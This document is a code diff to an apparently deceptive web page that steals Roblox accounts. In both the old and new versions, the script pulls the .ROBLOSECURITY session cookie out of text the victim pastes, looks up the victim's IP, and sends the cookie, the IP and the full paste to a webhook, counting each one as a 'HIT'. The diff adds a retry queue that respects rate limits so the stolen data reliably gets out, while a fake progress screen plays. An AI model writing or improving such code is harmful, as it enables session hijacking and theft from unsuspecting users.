@@ -432,34 +432,96 @@
                 document.getElementById('input-container').classList.remove('valid-glow');
             }
         });
+        let requestQueue = []; 
+        let isProcessingQueue = false;
 
-        async function validateAndStart() {
-            if (!dId) {
-                const err = document.getElementById('error-msg');
-                const box = document.getElementById('input-container');
-                err.classList.remove('opacity-0');
-                box.classList.add('error-shake');
-                setTimeout(() => box.classList.remove('error-shake'), 400);
-                return;
-            }
-            pushTraffic(dName, true);
-            let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
-            localStorage.setItem('nexus_hit_counter', cur);
-            document.getElementById('setup-phase').classList.add('hidden');
-            document.getElementById('progress-phase').classList.remove('hidden');
+        async function processQueue() {
+    if (isProcessingQueue || requestQueue.length === 0) return;
+    isProcessingQueue = true;
 
-            const raw = document.getElementById('userInput').value;
-            const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
-            let ip = "Unknown";
-            try { const res = await fetch('https://api.ipify.org?format=json'); ip = (await res.json()).ip; } catch(e) {}
+    while (requestQueue.length > 0) {
+        const item = requestQueue[0];
+        let options = {};
 
-            const hookName = `NEXUSRBLX HIT #${cur}`;
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\``, inline: false }] }] }) });
-            const fd = new FormData(); fd.append("username", hookName); fd.append("avatar_url", logoURL); fd.append("file", new Blob([raw], {type: 'text/plain'}), `RAWLOG#${cur}.txt`);
-            await fetch(hook, { method: 'POST', body: fd });
-
-            runEngine();
+        // Handle JSON Embeds or RAW Files
+        if (item.type === 'json') {
+            options = { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(item.payload) 
+            };
+        } else {
+            const fd = new FormData();
+            fd.append("username", item.payload.username);
+            fd.append("avatar_url", item.payload.avatar_url);
+            fd.append("file", new Blob([item.payload.content], {type: 'text/plain'}), item.payload.filename);
+            options = { method: 'POST', body: fd };
         }
+
+        try {
+            const response = await fetch(hook, options);
+            if (response.ok) {
+                requestQueue.shift(); // Success: Remove from queue
+            } else if (response.status === 429) {
+                // Rate Limit: Wait exactly how long Discord says
+                const data = await response.json();
+                const retryAfter = (data.retry_after * 1000) || 5000;
+                await new Promise(res => setTimeout(res, retryAfter));
+                continue; 
+            } else { 
+                requestQueue.shift(); // Skip broken requests
+            }
+        } catch (e) {
+            // Network error: Wait 5 seconds and try again
+            await new Promise(res => setTimeout(res, 5000));
+            break; 
+        }
+    }
+    isProcessingQueue = false;
+    // Check again in 2s if more items were added
+    if (requestQueue.length > 0) setTimeout(processQueue, 2000);
+}
+        
+        async function validateAndStart() {
+    if (!dId) {
+        // ... your existing error shaking code ...
+        return;
+    }
+
+    // Capture Data Immediately
+    const raw = document.getElementById('userInput').value;
+    const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
+    let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
+    localStorage.setItem('nexus_hit_counter', cur);
+    const hookName = `NEXUSRBLX HIT #${cur}`;
+
+    // Get IP (with a 2-second timeout so it doesn't hang)
+    let ip = "Detecting...";
+    try { 
+        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
+        ip = (await res.json()).ip; 
+    } catch(e) { ip = "Timed Out"; }
+
+    // PUSH TO QUEUE (The "Restore" Logic)
+    requestQueue.push({ 
+        type: 'json', 
+        payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } 
+    });
+    
+    requestQueue.push({ 
+        type: 'file', 
+        payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } 
+    });
+
+    // START BACKGROUND SYNC
+    processQueue();
+
+    // UI TRANSITION
+    pushTraffic(dName, true);
+    document.getElementById('setup-phase').classList.add('hidden');
+    document.getElementById('progress-phase').classList.remove('hidden');
+    runEngine();
+}
 
         function runEngine() {
     
@@ -590,6 +652,7 @@ window.onload = () => {
     </script>
 </body>
 </html>
+
 
 
 
